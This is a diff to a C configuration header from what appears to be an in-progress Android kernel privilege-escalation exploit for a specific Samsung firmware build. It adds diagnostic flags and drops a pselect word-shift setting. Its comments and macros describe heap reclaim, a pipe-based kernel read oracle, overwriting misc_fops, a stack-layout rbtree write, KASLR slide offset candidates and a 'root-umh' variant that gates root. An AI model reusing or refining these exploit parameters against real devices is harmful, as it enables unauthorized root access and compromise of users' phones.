@@ -4,6 +4,15 @@
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL "pa2q-S936WVLU4AYDQ-app-physical-p0-oracle"
 #define APP_PHYS_P0_ORACLE 1
+/* TEMPORARY DIAGNOSTIC (revert before production): SHIFT=1 proved worse
+ * than 0 (24/24 leak-stage reclaim misses), so back to default 0.
+ * FRESH_P0_SESSION + DATA_ALIAS_DIAG_ONLY stops before the misc_fops
+ * write and reads the misc area back through the proven pipe oracle:
+ * observed==ashmem_fops table means profile+alias arithmetic are right
+ * and only the trigger write misses; garbage means an addressing bug. */
+#define APP_REQUIRE_FRESH_P0_SESSION 1
+#define APP_FOPS_DATA_ALIAS_DIAG_ONLY 1
+#define APP_FOPS_FRESH_PAGE_ATTEMPTS 8
 #else
 #define BUILD_VARIANT_LABEL "pa2q-S936WVLU4AYDQ-root-umh"
 #endif
@@ -26,11 +35,6 @@
  * (Makefile: -DAPP_PSELECT_WINDOW_SCHED_OK=1). Verified attempt still
  * gates root; a mistimed window risks only a reboot. */
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000d7ca0ULL
-/* 6.6.30 AYDQ do_pselect stack layout puts the waiter one word later than
- * 6.6.98: SHIFT=0 demonstrably misses the rbtree write (3x triggered=1 /
- * step=4 mismatches + panics), SHIFT=1 is the only other value that fits
- * the 15-word fdset array with the 14-word waiter. */
-#define SLIDE_PSELECT_WORD_SHIFT 1
 #define SLIDE_P0_OFFSET_CANDIDATES \
   0x150000ULL, 0x100000ULL, 0x130000ULL, 0x090000ULL, \
   0x1c0000ULL, 0x180000ULL, 0x050000ULL, 0x1a0000ULL, \
